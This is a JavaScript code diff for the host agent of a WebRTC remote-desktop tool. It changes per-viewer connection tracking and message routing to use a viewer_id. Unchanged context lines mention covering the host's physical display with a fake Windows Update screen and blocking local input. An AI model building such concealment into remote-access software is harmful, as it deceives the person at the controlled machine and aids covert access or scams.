@@ -27,8 +27,8 @@ const agent = {
   ws:          null,
   pc:          null,  // kept for backward compat (points to most recent peer)
   dc:          null,  // kept for backward compat (points to most recent dc)
-  peers:       new Map(), // viewerIndex -> { pc, dc, dcKeepalive, disconnectTimeout, connectionState, connectedAt }
-  viewerCounter: 0,   // monotonically increasing viewer index
+  peers:       new Map(), // viewer_id -> { pc, dc, dcKeepalive, disconnectTimeout, connectionState, connectedAt }
+  viewerCounter: 0,   // monotonically increasing viewer index (legacy)
   stream:      null,
   blackStream: null,
   heartbeat:   null,
@@ -87,8 +87,8 @@ function agentCleanupPeer() {
   console.log('[host] 🧹 Cleaning up ALL peer connections');
 
   // Clean up all viewer peers
-  for (const [idx, peer] of agent.peers.entries()) {
-    agentCleanupViewerPeer(idx);
+  for (const [viewerId, peer] of agent.peers.entries()) {
+    agentCleanupViewerPeer(viewerId);
   }
   agent.peers.clear();
 
@@ -104,11 +104,11 @@ function agentCleanupPeer() {
   _setBlockInput(false);
 }
 
-function agentCleanupViewerPeer(viewerIdx) {
-  const peer = agent.peers.get(viewerIdx);
+function agentCleanupViewerPeer(viewerId) {
+  const peer = agent.peers.get(viewerId);
   if (!peer) return;
 
-  console.log(`[host] 🧹 Cleaning up peer for viewer #${viewerIdx}`);
+  console.log(`[host] 🧹 Cleaning up peer for viewer ${viewerId}`);
 
   if (peer.dcKeepalive) { clearInterval(peer.dcKeepalive); peer.dcKeepalive = null; }
   if (peer.disconnectTimeout) { clearTimeout(peer.disconnectTimeout); peer.disconnectTimeout = null; }
@@ -131,7 +131,7 @@ function agentCleanupViewerPeer(viewerIdx) {
     peer.pc = null;
   }
 
-  agent.peers.delete(viewerIdx);
+  agent.peers.delete(viewerId);
 
   // Update legacy compat refs if they pointed to this peer
   if (agent.pc === peer.pc) { agent.pc = null; agent.dc = null; }
@@ -166,13 +166,13 @@ function agentApplyBlackScreen(enabled) {
   // Only the host's physical display is covered by the fake Windows Update screen
 }
 
-async function agentCreateOffer() {
-  console.log('[host] 📞 agentCreateOffer called');
+async function agentCreateOffer(viewerId) {
+  console.log(`[host] 📞 agentCreateOffer called for viewer ${viewerId}`);
 
   // Guard: stream must be ready
   if (!agent.streamReady || !agent.stream) {
     console.warn('[host] ⛔ Stream not ready — retrying in 1s');
-    setTimeout(() => agentCreateOffer(), 1000);
+    setTimeout(() => agentCreateOffer(viewerId), 1000);
     return;
   }
 
@@ -182,9 +182,7 @@ async function agentCreateOffer() {
     return;
   }
 
-  // Assign a unique index to this viewer's peer connection
-  const viewerIdx = ++agent.viewerCounter;
-  console.log(`[host] 🆕 Creating peer connection for viewer #${viewerIdx} (total active: ${agent.peers.size + 1})`);
+  console.log(`[host] 🆕 Creating peer connection for viewer ${viewerId} (total active: ${agent.peers.size + 1})`);
 
   // Per-viewer peer state
   const peerState = {
@@ -195,7 +193,7 @@ async function agentCreateOffer() {
     connectionState: 'connecting',
     connectedAt: 0,
   };
-  agent.peers.set(viewerIdx, peerState);
+  agent.peers.set(viewerId, peerState);
 
   // CREATE NEW PEER CONNECTION
   const pc = new RTCPeerConnection(RTC_CONFIG);
@@ -207,7 +205,7 @@ async function agentCreateOffer() {
   // ADD ALL TRACKS BEFORE CREATING OFFER
   tracks.forEach(track => {
     pc.addTrack(track, agent.stream);
-    console.log(`[host] ✅ Track added to viewer #${viewerIdx}: ${track.kind}`);
+    console.log(`[host] ✅ Track added to viewer ${viewerId}: ${track.kind}`);
   });
 
   // CREATE DATA CHANNEL (HOST SIDE ONLY)
@@ -216,7 +214,7 @@ async function agentCreateOffer() {
   agent.dc = dc;
 
   dc.onopen = () => {
-    console.log(`[host] ✅ DataChannel OPEN for viewer #${viewerIdx}`);
+    console.log(`[host] ✅ DataChannel OPEN for viewer ${viewerId}`);
     _setViewerConn(true);
 
     // Start keepalive ping
@@ -230,7 +228,7 @@ async function agentCreateOffer() {
   };
 
   dc.onclose = () => {
-    console.log(`[host] ⚠️  DataChannel CLOSED for viewer #${viewerIdx}`);
+    console.log(`[host] ⚠️  DataChannel CLOSED for viewer ${viewerId}`);
     if (peerState.dcKeepalive) { clearInterval(peerState.dcKeepalive); peerState.dcKeepalive = null; }
     const anyConnected = [...agent.peers.values()].some(p => p.connectionState === 'connected');
     _setViewerConn(anyConnected);
@@ -239,7 +237,7 @@ async function agentCreateOffer() {
   dc.onerror = (err) => {
     const msg = err?.error?.message || '';
     if (!msg.includes('User-Initiated Abort') && !msg.includes('Close called')) {
-      console.error(`[host] ❌ DataChannel error for viewer #${viewerIdx}:`, err);
+      console.error(`[host] ❌ DataChannel error for viewer ${viewerId}:`, err);
     }
   };
 
@@ -248,7 +246,7 @@ async function agentCreateOffer() {
       const msg = JSON.parse(e.data);
       if (msg.type === 'ping' || msg.type === 'pong') return;
 
-      console.log(`[host] 📨 DC msg from viewer #${viewerIdx}: type=${msg.type}`);
+      console.log(`[host] 📨 DC msg from viewer ${viewerId}: type=${msg.type}`);
 
       // Clipboard sync
       if (msg.type === 'clipboard' && IS_ELECTRON) {
@@ -298,21 +296,25 @@ async function agentCreateOffer() {
   // ICE CANDIDATE HANDLER
   pc.onicecandidate = (e) => {
     if (e.candidate && agent.ws?.readyState === WebSocket.OPEN) {
-      agent.ws.send(JSON.stringify({ type: 'ice-candidate', candidate: e.candidate.toJSON() }));
+      agent.ws.send(JSON.stringify({ 
+        type: 'ice-candidate', 
+        candidate: e.candidate.toJSON(),
+        viewer_id: viewerId  // Include viewer ID for routing
+      }));
     }
   };
 
   pc.oniceconnectionstatechange = () => {
     if (pc.iceConnectionState === 'failed') {
-      console.error(`[host] ❌ ICE failed for viewer #${viewerIdx}`);
-      agentCleanupViewerPeer(viewerIdx);
+      console.error(`[host] ❌ ICE failed for viewer ${viewerId}`);
+      agentCleanupViewerPeer(viewerId);
     }
   };
 
   // PEER CONNECTION STATE MONITORING
   pc.onconnectionstatechange = () => {
     const s = pc.connectionState;
-    console.log(`[host] 🔌 Viewer #${viewerIdx} peer state: ${s}`);
+    console.log(`[host] 🔌 Viewer ${viewerId} peer state: ${s}`);
 
     if (s === 'connected') {
       peerState.connectionState = 'connected';
@@ -325,14 +327,14 @@ async function agentCreateOffer() {
       applyBitrateCap(pc);
       if (peerState.disconnectTimeout) { clearTimeout(peerState.disconnectTimeout); peerState.disconnectTimeout = null; }
     } else if (s === 'failed') {
-      agentCleanupViewerPeer(viewerIdx);
+      agentCleanupViewerPeer(viewerId);
     } else if (s === 'disconnected') {
       peerState.connectionState = 'disconnected';
       if (peerState.disconnectTimeout) clearTimeout(peerState.disconnectTimeout);
       peerState.disconnectTimeout = setTimeout(() => {
-        const p = agent.peers.get(viewerIdx);
+        const p = agent.peers.get(viewerId);
         if (p && (p.pc?.connectionState === 'disconnected' || p.pc?.connectionState === 'failed')) {
-          agentCleanupViewerPeer(viewerIdx);
+          agentCleanupViewerPeer(viewerId);
         }
       }, 2000);
     } else if (s === 'closed') {
@@ -347,7 +349,7 @@ async function agentCreateOffer() {
       audio.srcObject = event.streams[0] || new MediaStream([event.track]);
       audio.autoplay = true;
       audio.play().catch(() => {});
-      console.log(`[host] 🔊 Playing viewer #${viewerIdx} audio`);
+      console.log(`[host] 🔊 Playing viewer ${viewerId} audio`);
     }
   };
 
@@ -358,11 +360,12 @@ async function agentCreateOffer() {
     agent.ws.send(JSON.stringify({
       type: 'offer',
       sdp: { type: pc.localDescription.type, sdp: pc.localDescription.sdp },
+      viewer_id: viewerId  // Include viewer ID for routing
     }));
-    console.log(`[host] 📤 Offer sent for viewer #${viewerIdx}`);
+    console.log(`[host] 📤 Offer sent for viewer ${viewerId}`);
   } catch (err) {
-    console.error(`[host] ❌ Error creating/sending offer for viewer #${viewerIdx}:`, err);
-    agentCleanupViewerPeer(viewerIdx);
+    console.error(`[host] ❌ Error creating/sending offer for viewer ${viewerId}:`, err);
+    agentCleanupViewerPeer(viewerId);
   }
 }
 
@@ -458,6 +461,11 @@ function agentConnectWebSocket() {
           
         case 'viewer_connected':
           console.log('[host] 👁️  New viewer connected — creating dedicated peer connection');
+          const viewerId = data.viewer_id;
+          if (!viewerId) {
+            console.error('[host] ❌ No viewer_id in viewer_connected message');
+            return;
+          }
           // Don't cleanup existing connections — create a new one for this viewer
           // Each viewer gets its own independent peer connection
           if (agent.disconnectTimeout) {
@@ -465,7 +473,7 @@ function agentConnectWebSocket() {
             agent.disconnectTimeout = null;
           }
           agent.lastViewerConnect = Date.now();
-          await agentCreateOffer();
+          await agentCreateOffer(viewerId);
           break;
           
         case 'viewer_disconnected':
@@ -477,25 +485,43 @@ function agentConnectWebSocket() {
           
         case 'answer':
           console.log('[host] 📥 Received answer from viewer');
-          if (agent.pc) {
+          const answerViewerId = data.viewer_id;
+          if (answerViewerId && agent.peers.has(answerViewerId)) {
+            const peer = agent.peers.get(answerViewerId);
+            if (peer.pc) {
+              await peer.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+              console.log(`[host] ✅ Remote description set for viewer ${answerViewerId}`);
+            }
+          } else if (agent.pc) {
+            // Fallback for backward compatibility
             await agent.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-            console.log('[host] ✅ Remote description set');
+            console.log('[host] ✅ Remote description set (legacy fallback)');
           }
           break;
 
         case 'offer':
           // Viewer sent a renegotiation offer (e.g. added mic track for 2-way audio)
           console.log('[host] 📥 Received renegotiation offer from viewer');
-          if (agent.pc) {
+          const offerViewerId = data.viewer_id;
+          let targetPc = null;
+          
+          if (offerViewerId && agent.peers.has(offerViewerId)) {
+            targetPc = agent.peers.get(offerViewerId).pc;
+          } else {
+            targetPc = agent.pc; // Fallback for backward compatibility
+          }
+          
+          if (targetPc) {
             try {
-              await agent.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-              const answer = await agent.pc.createAnswer();
-              await agent.pc.setLocalDescription(answer);
+              await targetPc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+              const answer = await targetPc.createAnswer();
+              await targetPc.setLocalDescription(answer);
               agent.ws.send(JSON.stringify({
                 type: 'answer',
-                sdp: { type: agent.pc.localDescription.type, sdp: agent.pc.localDescription.sdp },
+                sdp: { type: targetPc.localDescription.type, sdp: targetPc.localDescription.sdp },
+                viewer_id: offerViewerId  // Include viewer ID for routing back
               }));
-              console.log('[host] ✅ Renegotiation answer sent');
+              console.log(`[host] ✅ Renegotiation answer sent to viewer ${offerViewerId || 'legacy'}`);
             } catch (e) {
               console.error('[host] ❌ Renegotiation failed:', e.message);
             }
@@ -503,9 +529,17 @@ function agentConnectWebSocket() {
           break;
           
         case 'ice-candidate':
-          if (agent.pc && data.candidate) {
+          const iceViewerId = data.viewer_id;
+          if (iceViewerId && agent.peers.has(iceViewerId)) {
+            const peer = agent.peers.get(iceViewerId);
+            if (peer.pc && data.candidate) {
+              await peer.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+              console.log(`[host] 🧊 ICE candidate added for viewer ${iceViewerId}`);
+            }
+          } else if (agent.pc && data.candidate) {
+            // Fallback for backward compatibility
             await agent.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
-            console.log('[host] 🧊 ICE candidate added');
+            console.log('[host] 🧊 ICE candidate added (legacy fallback)');
           }
           break;
           
